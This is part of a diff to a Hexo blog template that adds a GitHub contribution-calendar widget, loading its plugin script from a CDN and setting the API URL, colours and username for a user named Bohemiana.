+  <script data-pjax src="https://cdn.jsdelivr.net/gh/Zfour/hexo-github-calendar@1.21/hexo_githubcalendar.js"></script>
+  <script data-pjax>
+        function GithubCalendarConfig(){
+            var git_githubapiurl ="https://githubcalendarapi.shiguang666.eu.org/api?user=Bohemiana";
+            var git_color =['#ebedf0', '#f0fff4', '#dcffe4', '#bef5cb', '#85e89d', '#34d058', '#28a745', '#22863a', '#176f2c', '#165c26', '#144620'];
+            var git_user ="Bohemiana";
+            var parent_div_git = document.getElementById('recent-posts');
+            var git_div_html = '<div class="recent-post-item" style="width:100%;height:auto;padding:10px;"><div id="github_loading" style="width:10%;height:100%;margin:0 auto;display: block"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"  viewBox="0 0 50 50" style="enable-background:new 0 0 50 50" xml:space="preserve"><path fill="#d0d0d0" d="M25.251,6.461c-10.318,0-18.683,8.365-18.683,18.683h4.068c0-8.071,6.543-14.615,14.615-14.615V6.461z" transform="rotate(275.098 25 25)"><animateTransform attributeType="xml" attributeName="transform" type="rotate" from="0 25 25" to="360 25 25" dur="0.6s" repeatCount="indefinite"></animateTransform></path></svg></div><div id="github_container"></div></div>';
+            if(parent_div_git && location.pathname =='/'){
+                console.log("已挂载hexo-github-calendar https://github.com/Barry-Flynn/hexo-github-calendar");
+                // parent_div_git.innerHTML=git_div_html+parent_div_git.innerHTML // 无报错，但不影响使用(支持pjax跳转)
+                parent_div_git.insertAdjacentHTML("afterbegin",git_div_html) // 有报错，但不影响使用(支持pjax跳转)
+            };
+            GithubCalendar(git_githubapiurl,git_color,git_user)
+        }
+        if(document.getElementById('recent-posts')){
+            GithubCalendarConfig()
+        }
+    </script>
+    <style>#github_container{min-height:280px}@media screen and (max-width:650px) {#github_container{background-image:;min-height:0px}}</style>
+    <style></style><!-- hexo injector body_end end --></body></html>
